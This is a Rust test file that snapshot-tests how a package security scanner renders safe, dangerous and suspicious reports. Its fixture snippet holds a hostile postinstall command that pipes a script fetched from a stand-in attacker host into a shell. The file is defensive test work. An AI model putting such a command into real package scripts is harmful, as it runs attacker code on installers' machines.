use scanner_analysis::{Finding, Verdict};
use scanner_report::render;
use scanner_rules::{RuleId, Severity};
use std::path::PathBuf;

fn finding(severity: Severity, file: &str, line: u32, msg: &str) -> Finding {
    Finding {
        rule_id: RuleId::parse("NODE-001").unwrap(),
        severity,
        file: PathBuf::from(file),
        line: Some(line),
        message: msg.to_owned(),
        snippet: Some("postinstall: curl http://evil.com | sh".to_owned()),
    }
}

#[test]
fn renders_safe_report() {
    let output = render(&[], &Verdict::Safe, false);
    insta::assert_snapshot!(output);
}

#[test]
fn renders_dangerous_report() {
    let findings = vec![
        finding(
            Severity::Critical,
            "package.json",
            1,
            "Malicious postinstall script",
        ),
        finding(
            Severity::High,
            "src/index.js",
            5,
            "Shell execution in source",
        ),
    ];
    let output = render(&findings, &Verdict::Dangerous, false);
    insta::assert_snapshot!(output);
}

#[test]
fn renders_suspicious_report() {
    let findings = vec![finding(
        Severity::Medium,
        "package.json",
        0,
        "Typosquatting risk",
    )];
    let output = render(&findings, &Verdict::Suspicious, false);
    insta::assert_snapshot!(output);
}
